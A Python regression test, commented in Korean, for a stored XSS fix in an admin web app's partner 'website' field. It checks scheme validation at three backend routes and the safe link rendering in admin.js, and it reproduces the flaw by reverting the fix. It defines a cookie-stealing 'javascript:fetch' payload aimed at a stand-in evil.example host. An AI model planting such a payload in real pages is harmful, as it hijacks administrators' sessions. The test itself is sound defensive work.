# -*- coding: utf-8 -*-
"""스캔 509라운드 회귀 — partners.website(홈페이지) 저장형 XSS.

  정밀조사(직접 조사, 하위위임 없음) — admin.js 의 ~160개 렌더 지점을 다시
  훑다가, 라운드36(admin.js 2곳·insurer_portal.html 2곳)이 잡은 것과는
  **다른 결함 클래스**를 하나 더 찾았다: esc() 호출 자체는 있는데 그
  자리가 <a href="..."> 라서 esc() 만으로는 안 막히는 경우다.

  esc() (admin.js:104) 는 &<>"' 다섯 문자만 이스케이프한다. 'javascript:...'
  같은 값은 그 다섯 문자를 하나도 안 써도 완전한 페이로드가 되므로, esc()
  를 그대로 통과해 href 속성에 그대로 앉는다 — 브라우저는 target="_blank"
  여부와 무관하게 javascript: href 를 클릭한 탭에서 즉시 실행한다.

  실제 자리: admin.js ctEdit()(연락처 관리 화면의 '수정' 모달, 옛
  5471행) — `<a href="${{esc(p.website)}}">`. partners.website 를 채우는
  세 진입로(api_partner_create·api_partner_update·api_contact_import 엑셀
  일괄등록, app.py)가 전부 @require_admin 이라 **등급 무관**(하위관리자도
  포함)이고, 형제 필드(phone→RE_PHONE, email→RE_EMAIL, biz_no→
  valid_biz_no)는 전부 저장 전 형식 검사를 받는데 website 만 길이만
  자르고(FIELD_LIMITS/[:120]) 스킴 검사가 전혀 없었다 — 이 코드베이스가
  스스로 자주 잡아내는 '형제 필드 검증 누락' 패턴과 정확히 같은 모양이다.

  영향: 가장 낮은 등급(하위관리자)이 업체 정보를 고치며 website 에
  'javascript:...' 를 심으면, 그 업체의 연락처 수정창을 여는 **어떤
  관리자든(최고관리자 포함)** 링크를 클릭하는 순간 그 세션에서 임의 JS 가
  실행된다 — 등급상승 경로.

  고침: (a) 백엔드 — app.py 에 valid_website()(http/https 가 아닌 스킴만
  차단, 스킴 없는 값은 허용) 를 추가하고 세 진입로 모두에 형제(RE_PHONE 등)
  와 같은 자리·같은 관례로 검사를 건다. (b) 프런트 — admin.js ctEdit() 는
  http/https 로 시작할 때만 <a href> 로 걸고, 그 외에는(기존 저장분 등)
  이스케이프된 평문으로만 보여준다(클릭 가능한 링크가 아니면 스킴이
  무엇이든 위험하지 않다) — 지금까지 놓쳤을 수 있는 다른 진입로에 대한
  방어심화.

  [1] 소스 확인 — 세 백엔드 자리 + 프런트 한 자리에 새 코드가 정확히
      한 번씩만 있다(되돌림-증명에 쓸 블록 추출 겸용).
  [2] 실제 Flask 서브프로세스(하위관리자 세션) — 세 백엔드 진입로 모두
      위험한 스킴(javascript:·data:·vbscript:)은 거부하고, 정상 값
      (https:// · 스킴 없는 도메인)은 그대로 통과함을 실제 HTTP 라운드
      트립 + DB 직접 조회로 확인.
  [3] Node 실행 — admin.js 의 실제 esc() 정의와 ctEdit() 렌더 표현식을
      그대로 뽑아 실행해, 위험한 스킴은 href 에 앉지 못하고(평문으로만
      보임) 정상 https:// 값은 그대로 클릭 가능한 링크로 남는지 확인.
  [4] 되돌림-증명 — 세 백엔드 블록 + 프런트 한 줄을 전부 동시에 옛
      코드로 되돌리면 [2]·[3]의 위험한 값들이 실제로 다시 통과·노출됨을
      재현한 뒤, 두 파일 모두 원본과 바이트단위로 동일하게 복원한다.

      python test_scan_round509_fixes.py
"""
import io
import json
import os
import re
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
PASS, FAIL = [], []


def chk(cond, name, detail=""):
    (PASS if cond else FAIL).append((name, detail))
    print(("  [OK]   " if cond else "  [FAIL] ") + name + ("" if cond else f"   {detail}"))


print("=" * 72)
print("  스캔 509라운드 회귀 — partners.website 저장형 XSS (javascript: 스킴)")
print("=" * 72)

APP_PATH = os.path.join(HERE, "app.py")
JS_PATH = os.path.join(HERE, "static", "admin.js")
APP_SRC = io.open(APP_PATH, encoding="utf-8").read()
JS_SRC = io.open(JS_PATH, encoding="utf-8").read()

XSS = "javascript:fetch('https://evil.example/steal?c='+document.cookie)"
GOOD_HTTPS = "https://example.com"
GOOD_BARE = "example.com"

# ══════════════════════════════════════════════════════════════
print("\n[1] 소스 확인 — 세 백엔드 자리 + 프런트 한 자리에 새 코드가 정확히 한 번씩")
# ──────────────────────────────────────────────────────────────
#  ⚠⚠ [라운드609] round608이 발견한 새 결함군(RE_PHONE.match()/RE_EMAIL.match()/
#    valid_website()가 비문자열 JSON에 TypeError) 스윕 중 이 두 자리(create·update)의
#    website 검사도 raw d.get()/d[f] 직결이라 실결함이었다 — _s() 로 감싸는 처방이
#    추가되며 리터럴이 바뀌었다(차단 로직 자체는 그대로, 인자만 안전해짐). 이 블록은
#    [4] 되돌림-증명의 재료이기도 하므로, 검증 취지(위험한 스킴은 여전히 막힌다)는
#    그대로 두고 리터럴만 지금 코드와 맞춘다.
BLOCK_CREATE = (
    '    #  ⚠⚠ [라운드509] website 의 위험한 URL 스킴(javascript: 등) 검사 —\n'
    '    #    valid_website() 주석(5508행 부근) 참고.\n'
    '    #  ⚠⚠ [라운드609] valid_website() 내부도 raw (v or "").strip() 없는 re.sub라\n'
    '    #    d["website"]가 비문자열 truthy면 TypeError — _s() 로 감싼다.\n'
    '    if d.get("website") and not valid_website(_s(d.get("website"))):\n'
    '        return jsonify({"ok": False,\n'
    '                        "error": "홈페이지 주소는 http:// 또는 https:// 로 시작해야 합니다."}), 400\n'
)
BLOCK_UPDATE = (
    '            #  ⚠⚠ [라운드509] website 의 위험한 URL 스킴(javascript: 등) 검사 —\n'
    '            #    valid_website() 주석(5508행 부근) 참고. 이 실사용 경로(관리자\n'
    '            #    정보수정)는 등급 무관(require_admin)이라 하위관리자도 통과한다.\n'
    '            if f == "website" and d[f] and not valid_website(_s(d[f])):\n'
    '                return jsonify({"ok": False,\n'
    '                                "error": "홈페이지 주소는 http:// 또는 https:// 로 시작해야 합니다."}), 400\n'
)
BLOCK_IMPORT = (
    '                        #  ⚠⚠ [라운드509] website 의 위험한 URL 스킴(javascript: 등)\n'
    '                        #    검사 — valid_website() 주석(5508행 부근) 참고. 엑셀\n'
    '                        #    일괄등록도 admin.js ctEdit() 가 그대로 읽어 <a href> 에\n'
    '                        #    꽂는 같은 값을 채운다 — 같은 스킵+보고 관례를 따른다.\n'
    '                        if field == "website" and not valid_website(v):\n'
    '                            errs.append(f"\'{name}\' 홈페이지 주소 오류(http/https만 허용): {v}")\n'
    '                            continue\n'
)
FIXED_FRONT = (
    '    ${p.website?`<p style="font-size:.7rem;color:var(--faint)">홈페이지: '
    '${/^https?:\\/\\//i.test(p.website)?`<a href="${esc(p.website)}" target="_blank" '
    'rel="noopener">${esc(p.website)}</a>`:esc(p.website)} — 이메일 확인에 참고</p>`:\'\'}'
)
OLD_FRONT = (
    '    ${p.website?`<p style="font-size:.7rem;color:var(--faint)">홈페이지: '
    '<a href="${esc(p.website)}" target="_blank" rel="noopener">${esc(p.website)}</a> '
    '— 이메일 확인에 참고</p>`:\'\'}'
)

for label, block in (("create(직접등록)", BLOCK_CREATE), ("update(정보수정)", BLOCK_UPDATE),
                      ("contact_import(엑셀)", BLOCK_IMPORT)):
    chk(APP_SRC.count(block) == 1, f"백엔드 {label} — 새 검사 블록이 소스에 정확히 1번 있다",
        APP_SRC.count(block))
chk(JS_SRC.count(FIXED_FRONT) == 1, "프런트 ctEdit() — 새 렌더 표현식이 소스에 정확히 1번 있다",
    JS_SRC.count(FIXED_FRONT))
chk(OLD_FRONT not in JS_SRC, "프런트 — 옛(무방비) 렌더 표현식은 더 이상 없다")
chk("def valid_website(" in APP_SRC, "백엔드 — valid_website() 공용 검증함수가 정의되어 있다")

# ══════════════════════════════════════════════════════════════
print("\n[2] 실제 Flask 서브프로세스(하위관리자 세션) — 위험한 스킴 거부 · 정상값 통과")
# ──────────────────────────────────────────────────────────────
WORKER = os.path.join(HERE, "test_scan_round509_worker.py")


def _run_worker(broken=False):
    """broken=True 면 워커 서브프로세스 **안에서** 기법1(view_functions 스왑)로
    세 라우트를 되돌린 버전으로 바꿔치기하고 실행한다(R509_BROKEN 환경변수로
    트리거) — 실제 app.py 파일은 이 프로세스에서도 저 서브프로세스에서도
    전혀 안 건드린다(라운드625, 아래 [4] 주석 참고)."""
    env = dict(os.environ)
    if broken:
        env["R509_BROKEN"] = "1"
    r = subprocess.run([sys.executable, "-u", WORKER], capture_output=True,
                        text=True, encoding="utf-8", timeout=60, env=env)
    if r.returncode != 0:
        raise RuntimeError(f"워커 실행 실패(rc={r.returncode}): {r.stdout}\n{r.stderr}")
    return json.loads(r.stdout.strip().splitlines()[-1])


def _check_fixed_behavior(d, tag):
    chk(d.get("create_xss_status") == 400, f"{tag} create — javascript: 페이로드는 400으로 거부", d.get("create_xss_body"))
    chk(d.get("create_good_https_status") == 200, f"{tag} create — https:// 정상값은 200 통과")
    chk(d.get("create_good_bare_status") == 200, f"{tag} create — 스킴 없는 도메인도 200 통과(과잉차단 아님)")
    chk(d.get("update_xss_status") == 400, f"{tag} update — javascript: 페이로드는 400으로 거부", d.get("update_xss_body"))
    chk(d.get("update_xss_data_status") == 400, f"{tag} update — data: 페이로드도 400으로 거부")
    chk(d.get("update_xss_vbs_status") == 400, f"{tag} update — vbscript: 페이로드도 400으로 거부")
    chk(d.get("db_website_after_xss_attempt") is None,
        f"★★★★★ {tag} update — 거부된 페이로드가 DB 에 전혀 반영되지 않았다(NULL 그대로)",
        d.get("db_website_after_xss_attempt"))
    chk(d.get("update_good_http_status") == 200 and d.get("db_website_after_good") == "http://example.co.kr/path",
        f"{tag} update — 정상 http:// 값은 실제로 저장된다", d.get("db_website_after_good"))
    imp = d.get("import_xss_body") or {}
    chk(d.get("import_xss_status") == 200 and imp.get("skipped_invalid") == 1
        and imp.get("updated") == 0 and any("홈페이지" in e for e in imp.get("errors", [])),
        f"★★★★★ {tag} contact_import — javascript: 페이로드 행은 스킵+보고되고 갱신 0건", imp)
    chk(d.get("db_website_after_import_xss") == "http://example.co.kr/path",
        f"★★★★★ {tag} contact_import — 거부된 엑셀 페이로드가 DB 를 덮어쓰지 않았다(이전 정상값 그대로)",
        d.get("db_website_after_import_xss"))
    chk(d.get("import_good_bare_status") == 200
        and (d.get("import_good_bare_body") or {}).get("updated") == 1
        and d.get("db_website_after_import_good") == "example.com",
        f"{tag} contact_import — 스킴 없는 도메인은 엑셀로도 정상 반영된다(과잉차단 아님)",
        d.get("import_good_bare_body"))


try:
    fixed = _run_worker()
    _check_fixed_behavior(fixed, "[고친 코드]")
except Exception as e:                                              # noqa: BLE001
    chk(False, "[2] 고친 코드 워커 실행", f"{type(e).__name__}: {e}")

# ══════════════════════════════════════════════════════════════
print("\n[3] Node 실행 — 실제 esc()+ctEdit() 렌더 표현식을 그대로 실행")
# ──────────────────────────────────────────────────────────────
_esc_def = re.search(r"const esc = s => .*;", JS_SRC)
chk(bool(_esc_def), "★ admin.js 에서 esc() 정의를 뽑았다")
ESC_DEF = _esc_def.group(0) if _esc_def else ""

# FIXED_FRONT 는 `    ${...}` 형태의 한 줄이다 — 앞의 "    ${" 와 맨 끝의 "}" 를
# 벗기면 그 자체로 완결된 JS 삼항식이 된다(내부 중첩 백틱은 이미 균형이 맞다).
_stripped = FIXED_FRONT.strip()
assert _stripped.startswith("${") and _stripped.endswith("}")
INNER_EXPR = _stripped[2:-1]
chk(INNER_EXPR.startswith("p.website?") and INNER_EXPR.rstrip().endswith("''"),
    "★ ctEdit() 렌더 표현식에서 삼항식 본체를 정확히 뽑았다", INNER_EXPR[:60])


def _node_render(expr_src, payloads):
    node_script = f"""
{ESC_DEF}
function render(p) {{
  return ({expr_src});
}}
console.log(JSON.stringify({json.dumps(payloads)}.map(w => render({{website: w}}))));
"""
    tmpjs = os.path.join(tempfile.mkdtemp(prefix="r509js_"), "check.js")
    io.open(tmpjs, "w", encoding="utf-8").write(node_script)
    try:
        r = subprocess.run(["node", tmpjs], capture_output=True, text=True, encoding="utf-8", timeout=20)
        if r.returncode != 0:
            raise RuntimeError(r.stdout + r.stderr)
        return json.loads(r.stdout.strip().splitlines()[-1])
    finally:
        import shutil
        shutil.rmtree(os.path.dirname(tmpjs), ignore_errors=True)


try:
    out = _node_render(INNER_EXPR, [XSS, GOOD_HTTPS, GOOD_BARE])
    chk(len(out) == 3, "★ Node 렌더 실행이 3건을 돌려줬다", out)
    if len(out) == 3:
        xss_html, https_html, bare_html = out
        chk("href=" not in xss_html.lower(),
            "★★★★★ javascript: 페이로드는 클릭 가능한 링크로 렌더되지 않는다(href 자체가 없다)",
            xss_html)
        chk("javascript:" in xss_html.lower() and "<a " not in xss_html,
            "javascript: 페이로드는 이스케이프된 평문으로만 보인다(글자로는 남아있다)", xss_html)
        chk('href="https://example.com"' in https_html and "<a " in https_html,
            "★ 정상 https:// 값은 그대로 클릭 가능한 링크로 남는다(회귀 아님)", https_html)
        chk("<a " not in bare_html and "example.com" in bare_html,
            "스킴 없는 도메인은 평문으로만 보인다(링크는 아니지만 위험하지도 않다)", bare_html)
except Exception as e:                                              # noqa: BLE001
    chk(False, "[3] Node 렌더 실행", f"{type(e).__name__}: {e}")

# ══════════════════════════════════════════════════════════════
print("\n[4] 되돌림-증명 — 세 백엔드 블록 + 프런트 한 줄을 동시에 옛 코드로 되돌리면"
      " 재현되는가")
# ──────────────────────────────────────────────────────────────
#  ⚠⚠ [라운드625] 이전 버전은 이 되돌림을 실제 app.py·static/admin.js 파일에
#    io.open(...,"w").write() 로 디스크에 썼다가 finally 에서 복원하는
#    방식이었다. 세 백엔드 자리(create·update·import)는 전부 독립된 Flask
#    라우트라 기법1(view_functions 딕셔너리 스왑)로 옮기는데, 이 시나리오
#    자체가 서브프로세스 워커(test_scan_round509_worker.py, 하위관리자
#    세션·xlsx 업로드까지 필요)로 구성돼 있어 메인 프로세스와 상태를 공유할
#    수 없다 — 그래서 스왑은 R509_BROKEN=1 환경변수로 그 서브프로세스
#    **안에서** 트리거한다(워커 자신이 app.py 소스를 읽어 세 라우트를
#    되돌린 버전으로 exec+스왑, 실제 파일은 어느 프로세스에서도 안 건드림).
#    프런트(admin.js)는 애초에 _node_render() 가 이미 추출해 둔 OLD_FRONT
#    문자열만으로 렌더하고 실제 파일을 읽지 않으므로, 디스크에 쓸 이유
#    자체가 없었다 — 그 불필요한 쓰기를 그냥 없앤다.
try:
    broken = _run_worker(broken=True)
    chk(broken.get("create_xss_status") == 200,
        "★★★★★ 옛 코드(되돌림) — create 가 javascript: 페이로드를 200으로 그대로 저장한다"
        " — 이 테스트가 진짜 결함을 잡아낼 능력이 있음을 증명", broken.get("create_xss_status"))
    chk(broken.get("update_xss_status") == 200
        and broken.get("db_website_after_xss_attempt") == XSS,
        "★★★★★ 옛 코드(되돌림) — update 가 javascript: 페이로드를 그대로 DB 에 저장한다",
        broken.get("db_website_after_xss_attempt"))
    imp_broken = broken.get("import_xss_body") or {}
    chk(broken.get("import_xss_status") == 200 and imp_broken.get("updated") == 1
        and broken.get("db_website_after_import_xss") == XSS,
        "★★★★★ 옛 코드(되돌림) — 엑셀 일괄등록도 javascript: 페이로드를 그대로 반영한다",
        broken.get("db_website_after_import_xss"))

    broken_out = _node_render(OLD_FRONT.strip()[2:-1], [XSS, GOOD_HTTPS])
    chk(len(broken_out) == 2 and "href=\"javascript:" in broken_out[0].lower(),
        "★★★★★ 옛 코드(되돌림) — javascript: 페이로드가 실제로 <a href> 에 그대로 앉는다"
        " — 이 테스트가 진짜 결함을 잡아낼 능력이 있음을 증명", broken_out[0] if broken_out else None)
except Exception as e:                                              # noqa: BLE001
    chk(False, "[4] 되돌림-증명", f"{type(e).__name__}: {e}")

chk(io.open(APP_PATH, encoding="utf-8").read() == APP_SRC,
    "★★★★★ app.py는 이 검증 내내 디스크에 전혀 쓰이지 않았다(원본과 동일)")
chk(io.open(JS_PATH, encoding="utf-8").read() == JS_SRC,
    "★★★★★ admin.js는 이 검증 내내 디스크에 전혀 쓰이지 않았다(원본과 동일)")

print("\n" + "=" * 72)
print(f"  통과 {len(PASS)} · 실패 {len(FAIL)}")
print("=" * 72)
if FAIL:
    print("\n실패 상세:")
    for name, detail in FAIL:
        print(f"  - {name}: {detail}")
sys.exit(1 if FAIL else 0)
